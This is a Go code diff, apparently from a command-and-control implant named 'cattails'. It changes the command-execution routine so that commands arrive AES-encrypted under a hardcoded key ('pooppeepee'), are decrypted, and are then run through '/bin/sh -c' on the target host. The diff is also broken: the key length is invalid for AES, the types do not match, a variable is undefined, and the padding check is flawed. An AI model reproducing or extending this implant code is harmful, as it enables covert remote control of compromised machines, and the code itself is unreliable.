@@ -357,10 +357,19 @@ func CreateTargetCommand(cmd string, ip string) (command string) {
 }
 // ======
 
-func execCommand(command string) {
+func execCommand(ciphertext string) {
 	// Only run command if we didn't just run it
-	if lastCmdRan != command {
+	if lastCmdRan != ciphertext {
 		// fmt.Println("[+] COMMAND:", command)
+		
+		// Decrypt Packet
+		key := []byte("pooppeepee")
+		
+		command, err := decrypt(ciphertext, key)
+		if err != nil {
+			panic(err)
+		}
+		fmt.Printf("Decrypted: %s\n", decrypted)
 
 		// Run the command and get output
 		_, err := exec.Command("/bin/sh", "-c", command).CombinedOutput()
@@ -376,6 +385,41 @@ func execCommand(command string) {
 
 }
 
+func decrypt(ciphertext []byte, key []byte) ([]byte, error) {
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return nil, err
+	}
+
+	// Split the ciphertext into the IV and the actual ciphertext
+	if len(ciphertext) < aes.BlockSize {
+		return nil, errors.New("ciphertext too short")
+	}
+	iv := ciphertext[:aes.BlockSize]
+	ciphertext = ciphertext[aes.BlockSize:]
+
+	// Decrypt the ciphertext using AES in CBC mode
+	mode := cipher.NewCBCDecrypter(block, iv)
+	decrypted := make([]byte, len(ciphertext))
+	mode.CryptBlocks(decrypted, ciphertext)
+
+	// Remove padding from the decrypted plaintext
+	decrypted, err = unpad(decrypted, aes.BlockSize)
+	if err != nil {
+		return nil, err
+	}
+
+	return decrypted, nil
+}
+
+func unpad(data []byte, blockSize int) ([]byte, error) {
+	length := len(data)
+	padding := int(data[length-1])
+	if padding > blockSize || length < padding {
+		return nil, errors.New("invalid padding")
+	}
+	return data[:length-padding], nil
+}
 
 // =================================================cattails.go^====server.gov==================
 // Global to store staged command
